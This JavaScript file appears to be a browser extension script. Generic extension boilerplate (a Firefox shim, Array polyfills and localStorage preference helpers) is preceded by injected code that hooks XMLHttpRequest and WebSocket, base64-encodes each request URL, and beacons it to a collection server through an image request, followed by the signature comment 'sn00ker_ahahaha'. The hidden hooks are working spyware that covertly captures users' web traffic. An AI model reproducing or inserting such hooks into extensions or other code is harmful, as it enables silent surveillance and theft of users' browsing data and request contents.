function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function(e) {
  "use strict";
  if (e.navigator.userAgent.toLowerCase().indexOf("firefox") > -1) {
    e.chrome.runtime = e.browser.runtime;
    e.chrome.extension = e.browser.runtime;
    e.chrome.browserAction = e.browser.browserAction;
    e.chrome.tabs = e.browser.tabs;
    e.chrome.windows = e.browser.windows;
    e.chrome.storage = e.browser.storage;
    e.chrome.management = e.browser.management;
    e.chrome.i18n = e.browser.i18n;
    e.chrome = e.browser;
  }
  if (!Array.prototype.find) {
    Object.defineProperty(Array.prototype, "find", {
      value: function(e) {
        if (this == null) {
          throw new TypeError('"this" is null or not defined');
        }
        var r = Object(this);
        var t = r.length >>> 0;
        if (typeof e !== "function") {
          throw new TypeError("predicate must be a function");
        }
        var n = arguments[1];
        var o = 0;
        while (o < t) {
          var i = r[o];
          if (e.call(n, i, o, r)) {
            return i;
          }
          o++;
        }
        return undefined;
      }
    });
  }
  if (!Array.prototype.forEach) {
    Array.prototype.forEach = function(e) {
      var r, t;
      if (this == null) {
        throw new TypeError("this is null or not defined");
      }
      var n = Object(this);
      var o = n.length >>> 0;
      if (typeof e !== "function") {
        throw new TypeError(e + " is not a function");
      }
      if (arguments.length > 1) {
        r = arguments[1];
      }
      t = 0;
      while (t < o) {
        var i;
        if (t in n) {
          i = n[t];
          e.call(r, i, t, n);
        }
        t++;
      }
    };
  }
  (function() {
    var r = "";
    var t = {};
    function n(e) {
      var n = localStorage[r + e];
      if (n == null) {
        n = t[e];
        return n;
      }
      if (typeof n == "string") {
        if (n == "false") return false; else if (n == "true") return true; else if (typeof parseInt(n) != "number" && n != "NaN") return n; else if (parseInt(n) == n) return parseInt(n); else return "" + n;
      }
      return n;
    }
    function o(e, n) {
      var o = t[e];
      var i = r + e;
      if (typeof n == "object") {
        throw "object type not supported";
      } else if (o == n && localStorage[i] != null) delete localStorage[i]; else if (n == null) delete localStorage[i]; else localStorage[i] = n;
    }
    var i = {};
    var a = function(e, r) {
      if (r == null) if (e == null) throw "name and defaultValue must have a concrete values"; else return i[e];
      if (typeof e != "string") throw "name is not of type string";
      t[e] = r;
      i.__defineGetter__(e, function() {
        return n(e);
      });
      i.__defineSetter__(e, function(r) {
        o(e, r);
      });
    };
    e.pref = a;
    e.user = i;
  })();
  (function() {
    var r = {};
    var t = {};
    var n = function(e, n) {
      r[e] = n;
      t.__defineGetter__(e, function() {
        return r[e];
      });
      t.__defineSetter__(e, function(e) {
        throw "config is not mutable, if you need mutable key/val, use preferences machanism";
      });
    };
    e.conf = n;
    e.config = t;
  })();
  e.storageDefaultKeys = [];
  e.storageDefault = function(r, t) {
    e.storageDefaultKeys.push(r);
    if (!localStorage.getItem(r)) localStorage.setItem(r, t);
  };
})(this);